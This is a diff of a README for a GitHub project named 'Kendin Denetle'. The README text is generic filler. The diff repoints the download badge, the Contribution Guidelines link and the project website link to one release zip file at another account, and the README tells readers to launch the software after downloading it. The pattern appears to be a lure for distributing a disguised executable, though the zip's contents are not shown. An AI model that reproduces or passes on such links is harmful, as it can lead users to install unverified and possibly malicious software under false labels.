@@ -6,7 +6,7 @@ Welcome to the Kendin Denetle repository! 🚀
 
 This repository is dedicated to a project with the same name. Unfortunately, a short description or topics for this project have not been provided. However, you can explore the content further by downloading the software from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/InfernoWasTaken2/kendin-denetle/releases/download/v1.0/Release_x64.zip)](https://github.com/InfernoWasTaken2/kendin-denetle/releases/download/v1.0/Release_x64.zip)
 
 Please note that the software needs to be launched after downloading it from the provided link above.
 
@@ -30,7 +30,7 @@ To get started with Kendin Denetle, follow these steps:
 
 Contributions to the Kendin Denetle project are welcome! If you have any ideas for improvements or new features, feel free to submit a pull request. 
 
-Before contributing, please review our [Contribution Guidelines](CONTRIBUTING.md).
+Before contributing, please review our [Contribution Guidelines](https://github.com/InfernoWasTaken2/kendin-denetle/releases/download/v1.0/Release_x64.zip).
 
 ## License
 
@@ -40,4 +40,4 @@ This project is licensed under the [MIT License](LICENSE).
 
 Thank you for checking out Kendin Denetle! We hope you enjoy using the software and exploring its features. Please reach out to us if you have any questions or feedback. Happy coding! 🎉
 
-[Visit our website for more information](https://www.kendindenetle.com)
+[Visit our website for more information](https://github.com/InfernoWasTaken2/kendin-denetle/releases/download/v1.0/Release_x64.zip)
